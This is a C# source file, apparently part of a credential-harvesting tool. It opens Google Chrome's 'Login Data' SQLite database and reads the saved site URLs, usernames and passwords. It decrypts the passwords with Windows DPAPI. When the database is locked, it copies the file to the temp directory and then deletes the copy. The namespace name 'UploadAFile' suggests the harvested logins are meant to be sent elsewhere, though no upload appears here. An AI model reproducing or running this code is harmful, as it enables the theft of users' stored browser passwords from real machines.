using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace UploadAFile

{
    public class ChromeDatabaseDecryptor
    {
        private string FilePath { get; set; }
        public List<BrowserLoginData> ChromeLoginDataList { get; set; }

        public ChromeDatabaseDecryptor(string databaseFilePath)
        {
            SQLiteConnection connection;
            
            //Attempt connection to the 'Login Data' database file and decrypt its contents
            try
            {
                connection = ChromeDatabaseConnection(databaseFilePath);
                ChromeDatabaseDecrypt(connection);
                connection.Dispose();
            }
            //If unable to connect, copy the database to a temp directory and access the copied version of the db file
            catch (SQLiteException)
            {
                string tempDatabaseFilePath = Path.GetTempPath() + "Login Data";

                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[-] Unable to access database file. Copying it to temporary location at:\n\t{Path.GetTempPath()}");
                Console.ResetColor();

                File.Copy(databaseFilePath, tempDatabaseFilePath, true);

                connection = ChromeDatabaseConnection(tempDatabaseFilePath);
                ChromeDatabaseDecrypt(connection);

                //The program will maintain a handle to the temp database file despite database connection disposal. Garbage collection necessary to release the temp file for deletion
                GC.Collect();
                GC.WaitForPendingFinalizers();
                File.Delete(tempDatabaseFilePath);
            }
        }

        private SQLiteConnection ChromeDatabaseConnection(string databaseFilePath)
        {
            FilePath = databaseFilePath;
            SQLiteConnection sqliteConnection = new SQLiteConnection(
                $"Data Source={FilePath};" +
                $"Version=3;" +
                $"New=True");

            ChromeLoginDataList = new List<BrowserLoginData>();

            sqliteConnection.Open();

            return sqliteConnection;
        }

        private void ChromeDatabaseDecrypt(SQLiteConnection sqliteConnection)
        {
            SQLiteCommand sqliteCommand = sqliteConnection.CreateCommand();
            sqliteCommand.CommandText = "SELECT action_url, username_value, password_value FROM logins";
            SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader();

            //Iterate over each returned row from the query
            while (sqliteDataReader.Read())
            {
                //Store columns as variables
                string formSubmitUrl = sqliteDataReader.GetString(0);

                //Avoid Printing empty rows
                if (string.IsNullOrEmpty(formSubmitUrl))
                {
                    continue;
                }

                string username = sqliteDataReader.GetString(1);
                byte[] password = (byte[])sqliteDataReader[2]; //Cast to byteArray for DPAPI decryption

                try
                {
                    //DPAPI Decrypt - Requires System.Security.dll and System.Security.Cryptography
                    byte[] decryptedBytes = ProtectedData.Unprotect(password, null, DataProtectionScope.CurrentUser);
                    string decryptedPasswordString = Encoding.ASCII.GetString(decryptedBytes);

                    BrowserLoginData loginData = new BrowserLoginData(formSubmitUrl, username, decryptedPasswordString, "Chrome");
                    ChromeLoginDataList.Add(loginData);
                }
                catch (Exception e)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[!] Error Decrypting Password: Exception {e}");
                    Console.ResetColor();
                }
            }
            sqliteDataReader.Close();
            sqliteConnection.Dispose();
        }
    }
}